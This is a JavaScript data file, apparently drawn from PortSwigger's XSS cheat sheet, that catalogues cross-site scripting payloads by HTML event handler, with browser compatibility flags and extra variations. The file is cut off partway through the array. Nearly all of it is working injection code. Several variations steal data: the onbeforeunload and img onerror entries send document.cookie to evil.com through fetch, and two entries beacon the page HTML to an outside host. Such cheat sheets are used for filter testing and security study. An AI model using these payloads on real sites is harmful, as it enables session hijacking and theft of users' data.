// XSS Payloads Data extracted from PortSwigger cheat sheet
const xssPayloads = [
    {
        event: "onafterscriptexecute",
        description: "Fires after script is executed",
        tag: "custom tags",
        code: `<xss onafterscriptexecute=alert(1)><script>1</script>`,
        compatibility: {
            chrome: false,
            firefox: true,
            safari: false
        },
        category: "no-interaction",
        variations: [
            `<div onafterscriptexecute=alert('XSS')><script>1</script></div>`,
            `<span onafterscriptexecute=console.log('XSS')><script>document.body</script></span>`,
            `<custom onafterscriptexecute=eval('alert(1)')><script>void(0)</script></custom>`
        ]
    },
    {
        event: "onanimationcancel",
        description: "Fires when a CSS animation cancels",
        tag: "custom tags",
        code: `<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>`,
        compatibility: {
            chrome: false,
            firefox: true,
            safari: false
        },
        category: "animation-events",
        variations: [
            `<style>@keyframes slide{0%{left:0}100%{left:100px}}:target{animation:slide 1s}</style><div id=x onanimationcancel=alert(1)></div>`,
            `<style>@keyframes fade{from{opacity:1}to{opacity:0}}:target{animation:fade 2s}</style><span id=x onanimationcancel=console.log('XSS')></span>`
        ]
    },
    {
        event: "onanimationend",
        description: "Fires when a CSS animation ends",
        tag: "custom tags",
        code: `<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "animation-events",
        variations: [
            `<style>@keyframes bounce{0%{top:0}100%{top:50px}}</style><div style="animation:bounce 1s" onanimationend="alert('XSS')"></div>`,
            `<style>@keyframes rotate{from{transform:rotate(0)}to{transform:rotate(360deg)}}</style><span style="animation:rotate 0.5s" onanimationend="eval('alert(1)')"></span>`,
            `<style>@keyframes scale{0%{transform:scale(1)}100%{transform:scale(1.5)}}</style><p style="animation:scale 0.1s" onanimationend="console.log('XSS')"></p>`
        ]
    },
    {
        event: "onanimationiteration",
        description: "Fires when a CSS animation repeats",
        tag: "custom tags",
        code: `<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "animation-events",
        variations: [
            `<style>@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}</style><div style="animation:pulse 0.5s infinite" onanimationiteration="alert('XSS')"></div>`,
            `<style>@keyframes shake{0%,100%{left:0}50%{left:10px}}</style><span style="animation:shake 0.2s 3" onanimationiteration="console.log('XSS')"></span>`
        ]
    },
    {
        event: "onanimationstart",
        description: "Fires when a CSS animation starts",
        tag: "custom tags",
        code: `<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "animation-events",
        variations: [
            `<style>@keyframes grow{to{transform:scale(2)}}</style><div style="animation:grow 1s" onanimationstart="alert('XSS')"></div>`,
            `<style>@keyframes slide{to{left:100px}}</style><span style="animation:slide 2s" onanimationstart="eval('alert(1)')"></span>`,
            `<style>@keyframes fade{to{opacity:0}}</style><p style="animation:fade 3s" onanimationstart="console.log('XSS')"></p>`
        ]
    },
    {
        event: "onbeforeprint",
        description: "Fires before the page is printed",
        tag: "body",
        code: `<body onbeforeprint=console.log(1)>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: false
        },
        category: "no-interaction",
        variations: [
            `<body onbeforeprint=alert('Print detected!')>`,
            `<body onbeforeprint=eval('alert(1)')>`,
            `<body onbeforeprint=fetch('//evil.com/log?print=1')>`
        ]
    },
    {
        event: "onbeforescriptexecute",
        description: "Fires before script is executed",
        tag: "custom tags",
        code: `<xss onbeforescriptexecute=alert(1)><script>1</script>`,
        compatibility: {
            chrome: false,
            firefox: true,
            safari: false
        },
        category: "no-interaction",
        variations: [
            `<div onbeforescriptexecute=alert('XSS')><script>void(0)</script></div>`,
            `<span onbeforescriptexecute=console.log('XSS')><script>1+1</script></span>`,
            `<custom onbeforescriptexecute=eval('alert(1)')><script>document</script></custom>`
        ]
    },
    {
        event: "onbeforeunload",
        description: "Fires after if the url changes",
        tag: "body",
        code: `<body onbeforeunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: false
        },
        category: "no-interaction",
        variations: [
            `<body onbeforeunload=alert('Leaving page!')>`,
            `<body onbeforeunload=fetch('//evil.com/exfil?data='+document.cookie)>`,
            `<body onbeforeunload=eval('alert("Page unload")')>`
        ]
    },
    {
        event: "onbegin",
        description: "Fires when a svg animation begins",
        tag: "animate",
        code: `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "animation-events",
        variations: [
            `<svg><animate onbegin=alert('SVG Animation') attributeName=opacity dur=2s>`,
            `<svg><animate onbegin=console.log('XSS') attributeName=width dur=0.5s>`,
            `<svg><animate onbegin=eval('alert(1)') attributeName=height dur=3s>`
        ]
    },
    {
        event: "oncanplay",
        description: "Fires if the resource can be played",
        tag: "audio",
        code: `<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "media-events",
        variations: [
            `<audio oncanplay=alert('Audio ready')><source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSsFJHfH8N2QQAoUXrTp66hVFApGn+DyvmcfCEOX2fLNeSs=" type="audio/wav"></audio>`,
            `<video oncanplay=alert('Video ready')><source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC" type="video/mp4"></video>`
        ]
    },
    {
        event: "oncanplaythrough",
        description: "Fires when enough data has been loaded to play the resource all the way through",
        tag: "video",
        code: `<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "media-events",
        variations: [
            `<video oncanplaythrough=alert('Video loaded')><source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC" type="video/mp4"></video>`,
            `<audio oncanplaythrough=console.log('XSS')><source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10" type="audio/wav"></audio>`
        ]
    },
    {
        event: "oncontentvisibilityautostatechange",
        description: "Fires on all tags when content-visibility is set to auto",
        tag: "custom tags",
        code: `<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "no-interaction",
        variations: [
            `<div oncontentvisibilityautostatechange=alert('Visibility changed') style="display:block;content-visibility:auto">`,
            `<span oncontentvisibilityautostatechange=console.log('XSS') style="content-visibility:auto">`,
            `<p oncontentvisibilityautostatechange=eval('alert(1)') style="content-visibility:auto">`
        ]
    },
    {
        event: "oncontentvisibilityautostatechange(hidden)",
        description: "Fires in a hidden input when content-visibility is set to auto",
        tag: "input",
        code: `<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "no-interaction",
        variations: [
            `<input type=hidden oncontentvisibilityautostatechange=alert('Hidden input') style="content-visibility:auto">`,
            `<input type=hidden oncontentvisibilityautostatechange=console.log('XSS') style="content-visibility:auto">`
        ]
    },
    {
        event: "oncuechange",
        description: "Fires when subtitle changes",
        tag: "track",
        code: `<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE 1 00:00:00.000 --> 00:00:05.000 <b>XSS</b> "></video>`,
        compatibility: {
            chrome: true,
            firefox: false,
            safari: false
        },
        category: "media-events",
        variations: [
            `<video controls><source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC" type="video/mp4"><track default oncuechange=alert('Subtitle') src="data:text/vtt,WEBVTT%0A%0A00:00:00.000 --> 00:00:01.000%0ATest"></video>`
        ]
    },
    {
        event: "ondurationchange",
        description: "Fires when duration changes",
        tag: "audio",
        code: `<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "media-events",
        variations: [
            `<audio controls ondurationchange=alert('Duration changed')><source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10" type="audio/wav"></audio>`,
            `<video controls ondurationchange=console.log('XSS')><source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC" type="video/mp4"></video>`
        ]
    },
    {
        event: "onend",
        description: "Fires when a svg animation ends",
        tag: "animate",
        code: `<svg><animate onend=alert(1) attributeName=x dur=1s>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "animation-events",
        variations: [
            `<svg><animate onend=alert('Animation ended') attributeName=opacity dur=0.1s>`,
            `<svg><animate onend=console.log('XSS') attributeName=width dur=0.5s>`,
            `<svg><animateTransform onend=eval('alert(1)') attributeName=transform dur=1s>`
        ]
    },
    {
        event: "onended",
        description: "Fires when the resource is finished playing",
        tag: "audio",
        code: `<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "media-events",
        variations: [
            `<audio controls autoplay onended=alert('Audio ended')><source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10" type="audio/wav"></audio>`,
            `<video controls autoplay onended=console.log('XSS')><source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC" type="video/mp4"></video>`
        ]
    },
    {
        event: "onerror",
        description: "Fires when the resource fails to load or causes an error",
        tag: "audio",
        code: `<audio src/onerror=alert(1)>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "auto-events",
        variations: [
            `<img src/onerror=alert('Image error')>`,
            `<script src/onerror=alert('Script error')></script>`,
            `<video src/onerror=console.log('XSS')>`,
            `<iframe src/onerror=eval('alert(1)')>`,
            `<embed src/onerror=alert('Embed error')>`,
            `<object data/onerror=alert('Object error')>`,
            `<link rel=stylesheet href/onerror=alert('CSS error')>`,
            `<audio src=x onerror=alert('Audio error')>`,
            `<video src=x onerror=alert('Video error')>`,
            `<img src=x onerror=fetch('//evil.com/log?cookie='+document.cookie)>`
        ]
    },
    {
        event: "onfocus",
        description: "Fires when the element has focus",
        tag: "a",
        code: `<a id=x tabindex=1 onfocus=alert(1)></a>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "auto-events",
        variations: [
            `<input onfocus=alert('Input focused') value="test">`,
            `<textarea onfocus=console.log('XSS')></textarea>`,
            `<button onfocus=eval('alert(1)')>Click</button>`,
            `<select onfocus=alert('Select focused')><option>test</option></select>`
        ]
    },
    {
        event: "onfocus(autofocus)",
        description: "Fires when a element has focus and the autofocus attribute is used to focus automatically",
        tag: "custom tags",
        code: `<xss onfocus=alert(1) autofocus tabindex=1>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "auto-events",
        variations: [
            `<input onfocus=alert('Auto focused') autofocus>`,
            `<textarea onfocus=console.log('XSS') autofocus></textarea>`,
            `<button onfocus=eval('alert(1)') autofocus>Test</button>`,
            `<select onfocus=alert('Auto select') autofocus><option>test</option></select>`,
            `<div onfocus=alert('Div focused') autofocus tabindex=1>`,
            `<span onfocus=console.log('Span focused') autofocus tabindex=1>`
        ]
    },
    {
        event: "onfocusin",
        description: "Fires when the element has focus",
        tag: "a",
        code: `<a id=x tabindex=1 onfocusin=alert(1)></a>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "auto-events",
        variations: [
            `<input onfocusin=alert('Focus in') value="test">`,
            `<div onfocusin=console.log('XSS') tabindex=1>`,
            `<button onfocusin=eval('alert(1)')>Click</button>`
        ]
    },
    {
        event: "onhashchange",
        description: "Fires if the hash changes",
        tag: "body",
        code: `<body onhashchange="print()">`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "no-interaction",
        variations: [
            `<body onhashchange=alert('Hash changed')>`,
            `<body onhashchange=console.log('Hash: '+location.hash)>`,
            `<body onhashchange=eval('alert("Hash: "+location.hash)')>`
        ]
    },
    {
        event: "onload",
        description: "Fires when the element is loaded",
        tag: "body",
        code: `<body onload=alert(1)>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "auto-events",
        variations: [
            `<img onload=alert('Image loaded') src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><rect width='1' height='1'/></svg>">`,
            `<iframe onload=console.log('XSS') src="data:text/html,<h1>Test</h1>">`,
            `<script onload=eval('alert(1)') src="data:text/javascript,//comment"></script>`,
            `<link onload=alert('CSS loaded') rel=stylesheet href="data:text/css,body{color:red}">`,
            `<style onload=alert('Style loaded')>body{}</style>`,
            `<svg onload=alert('SVG loaded')><rect width="1" height="1"/></svg>`
        ]
    },
    {
        event: "onloadeddata",
        description: "Fires when the first frame is loaded",
        tag: "audio",
        code: `<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "media-events",
        variations: [
            `<audio onloadeddata=alert('Audio data loaded')><source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10" type="audio/wav"></audio>`,
            `<video onloadeddata=console.log('XSS')><source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC" type="video/mp4"></video>`
        ]
    },
    {
        event: "onloadedmetadata",
        description: "Fires when the meta data is loaded",
        tag: "audio",
        code: `<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "media-events",
        variations: [
            `<audio onloadedmetadata=alert('Metadata loaded')><source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10" type="audio/wav"></audio>`,
            `<video onloadedmetadata=console.log('XSS')><source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC" type="video/mp4"></video>`
        ]
    },
    {
        event: "onloadstart",
        description: "Triggered video is loaded",
        tag: "video",
        code: `<video onloadstart="alert(1)"><source></xss>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "media-events",
        variations: [
            `<video onloadstart=alert('Video load started')><source></video>`,
            `<audio onloadstart=console.log('XSS')><source></audio>`
        ]
    },
    {
        event: "onmessage",
        description: "Fires when message event is received from a postMessage call",
        tag: "body",
        code: `<body onmessage=print()>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "no-interaction",
        variations: [
            `<body onmessage=alert('Message received')>`,
            `<body onmessage=console.log('Message: '+event.data)>`,
            `<body onmessage=eval('alert("Message: "+event.data)')>`
        ]
    },
    {
        event: "onpagereveal",
        description: "Fires when the page is shown",
        tag: "body",
        code: `<body onpagereveal=alert(1)>`,
        compatibility: {
            chrome: false,
            firefox: false,
            safari: true
        },
        category: "no-interaction",
        variations: [
            `<body onpagereveal=alert('Page revealed')>`,
            `<body onpagereveal=console.log('Page reveal event')>`
        ]
    },
    {
        event: "onpageshow",
        description: "Fires when the page is shown",
        tag: "body",
        code: `<body onpageshow=alert(1)>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "no-interaction",
        variations: [
            `<body onpageshow=alert('Page shown')>`,
            `<body onpageshow=console.log('Page show event')>`,
            `<body onpageshow=eval('alert("Page shown")')>`
        ]
    },
    {
        event: "onplay",
        description: "Fires when the resource is played",
        tag: "audio",
        code: `<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "media-events",
        variations: [
            `<audio autoplay onplay=alert('Audio playing')><source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10" type="audio/wav"></audio>`,
            `<video autoplay onplay=console.log('XSS')><source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC" type="video/mp4"></video>`
        ]
    },
    {
        event: "onplaying",
        description: "Fires the resource is playing",
        tag: "audio",
        code: `<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "media-events",
        variations: [
            `<audio autoplay onplaying=alert('Audio is playing')><source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10" type="audio/wav"></audio>`,
            `<video autoplay onplaying=console.log('XSS')><source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC" type="video/mp4"></video>`
        ]
    },
    {
        event: "onpopstate",
        description: "Fires when the history changes",
        tag: "body",
        code: `<body onpopstate=print()>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "no-interaction",
        variations: [
            `<body onpopstate=alert('History changed')>`,
            `<body onpopstate=console.log('Popstate event')>`,
            `<body onpopstate=eval('alert("History change")')>`
        ]
    },
    {
        event: "onprogress",
        description: "Fires when the video/audio begins downloading",
        tag: "audio",
        code: `<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "media-events",
        variations: [
            `<audio controls onprogress=alert('Download progress')><source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10" type="audio/wav"></audio>`,
            `<video controls onprogress=console.log('XSS')><source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC" type="video/mp4"></video>`
        ]
    },
    {
        event: "onrepeat",
        description: "Fires when a svg animation repeats",
        tag: "animate",
        code: `<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "animation-events",
        variations: [
            `<svg><animate onrepeat=alert('Animation repeat') attributeName=opacity dur=0.5s repeatCount=3>`,
            `<svg><animateTransform onrepeat=console.log('XSS') attributeName=transform dur=1s repeatCount=2>`
        ]
    },
    {
        event: "onresize",
        description: "Fires when the window is resized",
        tag: "body",
        code: `<body onresize="print()">`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "no-interaction",
        variations: [
            `<body onresize=alert('Window resized')>`,
            `<body onresize=console.log('Resize event')>`,
            `<body onresize=eval('alert("Window resize")')>`
        ]
    },
    {
        event: "onscroll",
        description: "Fires when the page scrolls",
        tag: "body",
        code: `<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "no-interaction",
        variations: [
            `<body onscroll=alert('Page scrolled')><div style="height:2000px"></div>`,
            `<div onscroll=console.log('XSS') style="height:100px;overflow:auto"><div style="height:200px"></div></div>`,
            `<body onscroll=eval('alert("Scroll event")')><div style="height:1500px"></div>`
        ]
    },
    {
        event: "onscrollend",
        description: "Fires when the scrolling to the end of the element",
        tag: "custom tags",
        code: `<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "no-interaction",
        variations: [
            `<div onscrollend=alert('Scroll ended') style="display:block;overflow:auto;height:100px;width:200px;"><div style="height:300px">Content</div></div>`,
            `<body onscrollend=console.log('Page scroll ended')><div style="height:2000px"></div>`
        ]
    }
];

// Additional common XSS vectors for comprehensive coverage
const additionalPayloads = [
    {
        event: "onclick",
        description: "Fires when the element is clicked",
        tag: "button",
        code: `<button onclick=alert(1)>Click me</button>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
            `<div onclick=alert('Clicked')>Click this div</div>`,
            `<img onclick=console.log('XSS') src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><rect width='1' height='1'/></svg>">`,
            `<a href="#" onclick=eval('alert(1)');return false>Link</a>`,
            `<span onclick=alert('Span clicked') style="cursor:pointer">Clickable span</span>`
        ]
    },
    {
        event: "onmouseover",
        description: "Fires when mouse pointer moves over the element",
        tag: "div",
        code: `<div onmouseover=alert(1)>Hover me</div>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
            `<img onmouseover=alert('Mouse over') src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><rect width='1' height='1'/></svg>">`,
            `<p onmouseover=console.log('XSS')>Hover over this text</p>`,
            `<a onmouseover=eval('alert(1)') href="#">Hover link</a>`,
            `<button onmouseover=alert('Button hover')>Hover button</button>`
        ]
    },
    {
        event: "onsubmit",
        description: "Fires when form is submitted",
        tag: "form",
        code: `<form onsubmit=alert(1)><input type=submit value=Submit></form>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
            `<form onsubmit=alert('Form submitted');return false><input type=submit></form>`,
            `<form onsubmit=console.log('XSS');return false><button type=submit>Submit</button></form>`
        ]
    },
    {
        event: "onchange",
        description: "Fires when input value changes",
        tag: "input",
        code: `<input onchange=alert(1) value="test">`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
            `<select onchange=alert('Selection changed')><option>1</option><option>2</option></select>`,
            `<textarea onchange=console.log('XSS')>Test</textarea>`,
            `<input type=checkbox onchange=eval('alert(1)')>`
        ]
    },
    {
        event: "onkeydown",
        description: "Fires when key is pressed down",
        tag: "input",
        code: `<input onkeydown=alert(1) autofocus>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
            `<textarea onkeydown=alert('Key pressed') autofocus></textarea>`,
            `<body onkeydown=console.log('Key: '+event.key) tabindex=0>`,
            `<div onkeydown=eval('alert(1)') tabindex=0>Press key</div>`
        ]
    },
    {
        event: "onsecuritypolicyviolation",
        description: "Fires when a CSP violation occurs. This would be site specific",
        tag: "custom tags",
        code: `<xss onsecuritypolicyviolation=alert(1)>XSS</xss>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "no-interaction",
        variations: [
            `<div onsecuritypolicyviolation=alert('CSP Violation')>`,
            `<span onsecuritypolicyviolation=console.log('CSP triggered')>`
        ]
    },
    {
        event: "onsuspend",
        description: "Fires when the video/audio when the data loading is suspended",
        tag: "audio",
        code: `<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "media-events",
        variations: [
            `<audio onsuspend=alert('Audio suspended')><source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10" type="audio/wav"></audio>`,
            `<video onsuspend=console.log('Video suspended')><source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC" type="video/mp4"></video>`
        ]
    },
    {
        event: "ontimeupdate",
        description: "Fires when the timeline is changed",
        tag: "audio",
        code: `<audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "media-events",
        variations: [
            `<audio ontimeupdate=alert('Time updated')><source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10" type="audio/wav"></audio>`,
            `<video ontimeupdate=console.log('Video time update')><source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC" type="video/mp4"></video>`
        ]
    },
    {
        event: "ontoggle",
        description: "Fires when the details tag is expanded",
        tag: "details",
        code: `<details ontoggle=alert(1) open>test</details>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "auto-events",
        variations: [
            `<details ontoggle=alert('Details toggled') open>Click to expand</details>`,
            `<details ontoggle=console.log('Toggle event')><summary>Toggle</summary>Content</details>`
        ]
    },
    {
        event: "ontransitionend",
        description: "Fires when a CSS transition ends",
        tag: "custom tags",
        code: `<xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss>`,
        compatibility: {
            chrome: true,
            firefox: false,
            safari: false
        },
        category: "animation-events",
        variations: [
            `<div style="transition:opacity 0.1s" ontransitionend=alert('Transition ended') id=x tabindex=1></div>`,
            `<span style="transition:color 0.5s" ontransitionend=console.log('Color transition done')></span>`
        ]
    },
    {
        event: "ontransitionstart",
        description: "Fires when a CSS transition starts",
        tag: "custom tags",
        code: `<style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss>`,
        compatibility: {
            chrome: false,
            firefox: false,
            safari: true
        },
        category: "animation-events",
        variations: [
            `<style>:target{background:blue}</style><div id=x style="transition:background 0.5s" ontransitionstart=alert('Transition started')></div>`
        ]
    },
    {
        event: "onunhandledrejection",
        description: "Fires when a promise isn't handled",
        tag: "body",
        code: `<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>`,
        compatibility: {
            chrome: false,
            firefox: true,
            safari: false
        },
        category: "no-interaction",
        variations: [
            `<body onunhandledrejection=alert('Unhandled Promise')><script>Promise.reject('error')</script></body>`,
            `<body onunhandledrejection=console.log('Promise rejection')><script>fetch('//nonexistent')</script></body>`
        ]
    },
    {
        event: "onunload",
        description: "Fires when the page is unloaded",
        tag: "body",
        code: `<body onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: false
        },
        category: "no-interaction",
        variations: [
            `<body onunload=alert('Page unloading')>`,
            `<body onunload=console.log('Page unload event')>`
        ]
    },
    {
        event: "onwebkitanimationend",
        description: "Fires when a CSS animation ends",
        tag: "custom tags",
        code: `<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss>`,
        compatibility: {
            chrome: true,
            firefox: false,
            safari: true
        },
        category: "animation-events",
        variations: [
            `<style>@keyframes webkit{to{opacity:0}}</style><div style="animation:webkit 0.1s" onwebkitanimationend=alert('WebKit animation end')></div>`
        ]
    },
    {
        event: "onwebkitanimationstart",
        description: "Fires when a CSS animation starts",
        tag: "custom tags",
        code: `<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss>`,
        compatibility: {
            chrome: true,
            firefox: false,
            safari: true
        },
        category: "animation-events",
        variations: [
            `<style>@keyframes webkit{to{transform:scale(2)}}</style><div style="animation:webkit 1s" onwebkitanimationstart=alert('WebKit animation start')></div>`
        ]
    },
    {
        event: "oncontextmenu",
        description: "Triggered when right clicking to show the context menu",
        tag: "custom tags",
        code: `<xss oncontextmenu="alert(1)" style=display:block>test</xss>`,
        compatibility: {
            chrome: true,
            firefox: true,
            safari: true
        },
        category: "user-interaction",
        variations: [
